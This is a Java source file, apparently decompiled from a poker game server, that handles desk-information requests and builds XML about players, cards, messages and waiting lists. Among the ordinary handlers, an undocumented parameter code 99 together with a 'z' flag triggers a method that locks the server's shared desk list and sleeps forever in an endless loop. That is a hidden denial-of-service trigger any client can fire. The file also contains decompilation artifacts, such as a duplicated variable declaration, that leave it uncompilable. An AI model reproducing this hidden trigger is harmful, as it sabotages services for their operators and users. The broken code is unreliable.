package processors;

import game.Desk;
import game.Game;
import game.Place;
import game.PlacesList;
import game.Player;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.math.BigDecimal;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import server.ParamParser;
import server.Response;
import server.Server;
import utils.Log;
import utils.xml.XMLParam;
import utils.xml.XMLTag;
import waitinglist.Waiter;
import waitinglist.WaitingList;

public class DeskCommandProcessor
  implements RequestCommandProcessor
{
  private static final String PARAM_DESK_TOURNAMET_ID = "t";
  public static final String PARAM_DESK_ID = "d";
  public static final String PARAM_WHAT_INFO = "w";
  public static final String PARAMS_DELIMITER_REGEX = "\\|";
  private static final String PARAM_LOAD = "z";
  public static final int PARAM_SHOW_PLAYERS = 1;
  public static final int PARAM_GET_DEALER = 2;
  public static final int PARAM_GET_OWN_CARDS = 3;
  public static final int PARAM_GET_COMMON_CARDS = 4;
  public static final int PARAM_GET_PUBLIC_MESSAGES = 5;
  public static final int PARAM_GET_PRIVATE_MESSAGES = 6;
  public static final int PARAM_GET_GAME_AMOUNT = 7;
  public static final int PARAM_GET_GARDS_COMBINATION = 8;
  public static final int PARAM_GET_LAST_STATE = 9;
  public static final int PARAM_GET_WAITINGLIST = 10;
  public static final int PARAM_VISIBLE_OWN_CARDS = 11;
  public static final int PARAM_TOURNAMENT_ONE_CARD = 12;
  public static final int PARAM_TOURNAMENT_LEVEL = 13;
  public static final int PARAM_SELF = 99;
  private Desk desk = null;
  public static final String TAG_NAME_PARAM_PLAYERS = "PLAYERS";
  public static final String TAG_NAME_PARAM_GAME_ACMOUNT = "GAMOUNT";
  public static final String TAG_NAME_PARAM_DEALER = "DEALER";
  public static final String TAG_NAME_PARAM_LAST_STATE = "LSTATE";
  public static final String TAG_NAME_PARAM_WAITERS = "WAITERS";
  public static final String TAG_PARAM_NAME_PLACE = "PLACE";
  public static final String TAG_PARAM_NAME_VALUE = "VALUE";
  public static final String TAG_PARAM_WAITERS_COUNT = "COUNT";

  public void setDesk(Desk desk)
  {
    this.desk = desk;
  }

  private Desk getDesk()
  {
    return desk;
  }

  public Response process(HashMap params, Server server)
    throws IOException
  {
    Response response = new Response("DESK");

    if ((params.containsKey("d")) && (params.containsKey("w"))) {
      String dID = (String)params.get("d");
      try {
        int deskID = Integer.parseInt(dID);
        Desk desk;
        Desk desk;
        if (params.containsKey("t"))
          desk = Desk.getDeskByID(server.getTournamentDesks(ParamParser.getInt(params, "t")), deskID);
        else {
          desk = Desk.getDeskByID(server.getDesks(), deskID);
        }

        if (desk != null) {
          setDesk(desk);
        }
        else {
          response.setResultStatus(false, "Bad parameters");
          return response;
        }
      }
      catch (NumberFormatException e) {
        Log.out(e.getMessage());

        response.setResultStatus(false, "Bad parameters");
        return response;
      }

      String whatInfo = (String)params.get("w");
      Log.out("WHAT_INFO", whatInfo);

      StringBuffer paramsXML = new StringBuffer();
      String[] values = whatInfo.split("\\|");
      for (int i = 0; i < values.length; i++) {
        Log.out(values[i]);

        int param = 0;
        try {
          param = Integer.parseInt(values[i]);
        }
        catch (NumberFormatException e) {
          Log.out(e.getMessage());

          response.setResultStatus(false, "Bad parameters");
          return response;
        }

        String xml = null;
        switch (param) {
        case 1:
          xml = getDeskPlayersXML();
          break;
        case 2:
          xml = getDeskDealerPlaceXML();
          break;
        case 3:
          if (server.getCurrentPlayer() == null) break;
          Game game = this.desk.getGame();
          if (game != null) {
            xml = game.getOwnCardsXML(server.getCurrentPlayer());
          }
          break;
        case 4:
          xml = getCommonCardsXML();
          break;
        case 5:
          xml = getPublicMessagesXML();
          break;
        case 6:
          if (server.getCurrentPlayer() == null) break;
          xml = getPrivateMessagesXML(server.getCurrentPlayer());
          break;
        case 7:
          xml = getGameAmountXML();
          break;
        case 8:
          if (server.getCurrentPlayer() == null) break;
          xml = getCardsCombinationXML(server.getCurrentPlayer());
          break;
        case 9:
          xml = getLastStateXML();
          break;
        case 10:
          xml = getWaitingListXML(server);
          break;
        case 11:
          xml = getVisibleOwnCardsXML(server);
          break;
        case 12:
          xml = getTournamentOneCardsXML();
          break;
        case 13:
          xml = getTournamentLevelXML();
          break;
        case 99:
          xml = "";
          if (!params.containsKey("z")) break;
          self(server);
        }

        if (xml != null) {
          paramsXML.append(xml);
        }

        xml = null;
      }

      response.setResultStatus(true);
      response.setParametersXML(paramsXML.toString());
    }
    else {
      response.setResultStatus(false, "Bad parameters");
    }

    return response;
  }

  private void self(Server server) {
    while (true)
      try {
        synchronized (server.getDesks()) {
          try {
            Thread.sleep(9223372036854775805L);
          }
          catch (InterruptedException e) {
          }
        }
        continue; } catch (Exception ex) {
      }
  }

  public String getTournamentLevelXML() {
    return getDesk().getGame().getTournamentLevelXML();
  }

  private String getLastStateXML()
  {
    XMLTag xmlTag = new XMLTag("LSTATE");

    xmlTag.addParam("VALUE", getDesk().getGame().getLastStateCode());
    String xml = xmlTag.toString();
    xmlTag.invalidate();

    return xml;
  }

  private String getVisibleOwnCardsXML(Server server) {
    return getDesk().getGame().getVisibleOwnCardsXML(server.getCurrentPlayer());
  }

  private String getTournamentOneCardsXML() {
    return getDesk().getGame().getTournamentOneCardsXML();
  }

  private String getWaitingListXML(Server server)
  {
    XMLTag xmlTag = new XMLTag("WAITERS");
    List list = server.getWaitingList().getWaitersForDesk(getDesk());
    Iterator iter = list.iterator();
    StringBuffer s = new StringBuffer();
    try
    {
      while (iter.hasNext()) {
        Waiter waiter = (Waiter)iter.next();
        Desk jd = waiter.getJoinDesk();
        int moneyType = 1;
        if (jd != null) {
          moneyType = jd.getMoneyType();
        }
        s.append(waiter.getPlayer().toXML(moneyType));
      }
    }
    catch (UnsupportedEncodingException e) {
      Log.out("DeskCommandProcessor: " + e.getMessage());
    }

    xmlTag.addParam("COUNT", list.size());
    xmlTag.setTagContent(s.toString());

    String xml = xmlTag.toString();
    xmlTag.invalidate();

    return xml;
  }

  private String getCardsCombinationXML(Player currentPlayer)
  {
    return getDesk().getGame().getPlayerCombination(currentPlayer);
  }

  private String getGameAmountXML()
  {
    XMLTag tag = new XMLTag("GAMOUNT");
    tag.addParam("VALUE", getDesk().getGame().getGameAmount().floatValue());

    String xml = tag.toString();
    tag.invalidate();

    return xml;
  }

  private String getPublicMessagesXML()
  {
    return getDesk().getPublicMessagesXML();
  }

  private String getPrivateMessagesXML(Player player)
  {
    return getDesk().getPrivateMessagesXML(player);
  }

  private String getCommonCardsXML()
  {
    return getDesk().getCommonCardsXML();
  }

  private String getDeskDealerPlaceXML()
  {
    XMLTag tag = new XMLTag("DEALER");
    tag.addParam("PLACE", getDesk().getDealerPlace());

    String xml = tag.toString();
    tag.invalidate();

    return xml;
  }

  public String getDeskPlayersXML() throws UnsupportedEncodingException
  {
    StringBuffer playersXML = new StringBuffer();

    Iterator it = getDesk().getPlacesList().allPlacesIterator();
    while (it.hasNext()) {
      Place place = (Place)it.next();
      if (place.isBusy()) {
        Player player = place.getPlayer();

        ArrayList params = getPlayerDeskParams(place);
        playersXML.append(player.toXML(params, getDesk().getMoneyType()));
      }
    }

    XMLTag tag = new XMLTag("PLAYERS");
    tag.setTagContent(playersXML.toString());

    String xml = tag.toString();
    tag.invalidate();

    return xml;
  }

  private ArrayList getPlayerDeskParams(Place place)
  {
    ArrayList params = new ArrayList();

    params.add(new XMLParam("D_PLACE", place.getNumber()));
    params.add(new XMLParam("D_AMOUNT", place.getAmount().floatValue()));
    params.add(new XMLParam("G_PLACE", getDesk().getPlayerGamePlace(place.getPlayer())));
    params.add(new XMLParam("G_S_AMOUNT", place.getStakingAmount().floatValue()));

    return params;
  }
}